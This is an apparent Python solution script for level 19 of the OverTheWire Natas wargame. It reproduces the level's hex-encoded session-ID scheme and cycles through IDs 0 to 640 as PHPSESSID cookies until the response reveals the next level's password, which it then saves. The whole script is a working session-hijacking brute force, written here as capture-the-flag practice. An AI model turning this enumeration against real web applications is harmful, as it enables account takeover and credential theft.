
import natas,re,requests,base64

B64='Basic %s' % base64.b64encode('%s:%s' % ('natas19',natas.get_credential('natas19')))
URL='http://natas19.natas.labs.overthewire.org/index.php'

"""
natas20:admin     3239332d6e617461733230
natas20:admin1    3431332d6e617461733230
natas21:admin     3632372d6e617461733231

pattern shows static backend (after \x2d) when user stays the same. 
only changes when user is changed, not with password.
first 3 bytes are a number similar to the one in natas18
"""

USER='admin'
PASSWORD='admin'

def main():
    for i in range(0,641):
        if (i % 20 == 0): 
            print('requesting: %d' % i)
        password = do_request(i)
        if (password is not None):
            print('found password at %d: %s' % (i,password))
            print('adding to credentials....')
            natas.save_credentials('natas20',password)
            print('done')
            break

def do_request(phpsessid):
    response = requests.post(
            URL,
            headers=dict(Authorization=B64),
            cookies=dict(PHPSESSID=gen_payload(phpsessid,USER)),
            data={
                'username':USER,
                'password':PASSWORD
            }
    )
    
    regex=r"Password: (\w+)"
    matches=re.finditer(regex,response.content,re.MULTILINE)

    for match in matches:
        return match.group(1)

    return None


def gen_payload(phpsessid,user):
    string = '%d-%s' % (phpsessid,user)
    payload = ''
    for c in string:
        payload += hex(ord(c))[2:]

    return payload


if __name__ == '__main__':
    main()
